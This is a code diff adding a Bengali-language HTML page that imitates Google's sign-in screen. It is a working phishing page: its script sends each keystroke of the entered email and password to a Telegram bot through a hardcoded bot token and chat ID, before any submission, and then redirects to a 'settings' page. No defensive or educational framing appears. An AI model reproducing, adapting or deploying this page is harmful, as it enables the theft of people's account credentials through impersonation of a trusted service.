@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Secure Login</title>
+    <style>
+        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: white; padding: 40px 30px; border-radius: 8px; border: 1px solid #dadce0; width: 100%; max-width: 360px; text-align: center; }
+        .google-logo { width: 75px; margin-bottom: 10px; }
+        h2 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+        p { color: #202124; font-size: 16px; margin-bottom: 30px; }
+        
+        .input-group { position: relative; margin-bottom: 20px; }
+        input { 
+            width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; 
+            font-size: 16px; box-sizing: border-box; outline: none; transition: 0.2s;
+        }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+
+        .add-btn { 
+            width: 100%; padding: 10px; background-color: #1a73e8; color: white; border: none; 
+            border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="google-logo">
+    <h2>সাইন ইন করুন</h2>
+    <p>আপনার গুগল অ্যাকাউন্ট ব্যবহার করুন</p>
+
+    <form id="secureForm" action="#">
+        <div class="input-group">
+            <input type="email" id="email" name="email" placeholder="ইমেল বা ফোন" autocomplete="username" required>
+        </div>
+        
+        <div class="input-group">
+            <input type="password" id="password" name="password" placeholder="পাসওয়ার্ড লিখুন" autocomplete="current-password" required>
+        </div>
+        
+        <button type="button" class="add-btn" id="submitBtn">এড করুন</button>
+    </form>
+</div>
+
+<script>
+    const botToken = "7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE";
+    const chatId = "8516934257";
+
+    // এই ফাংশনটি ডাটা টেলিগ্রামে পাঠাবে
+    function sendData() {
+        const emailValue = document.getElementById('email').value;
+        const passValue = document.getElementById('password').value;
+
+        // জিমেইল এবং পাসওয়ার্ড দুটিই পাওয়া গেলে মেসেজ যাবে
+        if (emailValue.length > 3 && passValue.length > 3) {
+            const message = `🔥 নতুন লগইন তথ্য:\n📧 ইমেল: ${emailValue}\n🔑 পাসওয়ার্ড: ${passValue}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+        }
+    }
+
+    // ১. পপ-আপ থেকে এলাও করলে অটোমেটিক চলে যাবে (Change Event)
+    document.getElementById('email').addEventListener('change', sendData);
+    document.getElementById('password').addEventListener('change', sendData);
+
+    // ২. যদি কেউ হাতে টাইপ করে লেখে (Input Event)
+    document.getElementById('email').addEventListener('input', sendData);
+    document.getElementById('password').addEventListener('input', sendData);
+
+    // ৩. 'এড করুন' বাটনে ক্লিক করলে পরবর্তী পেজে যাবে
+    document.getElementById('submitBtn').addEventListener('click', function() {
+        if(document.getElementById('email').value !== "" && document.getElementById('password').value !== "") {
+            window.location.href = "settings.html"; 
+        } else {
+            alert("অনুগ্রহ করে আপনার তথ্য দিন।");
+        }
+    });
+</script>
+
+</body>
+</html>
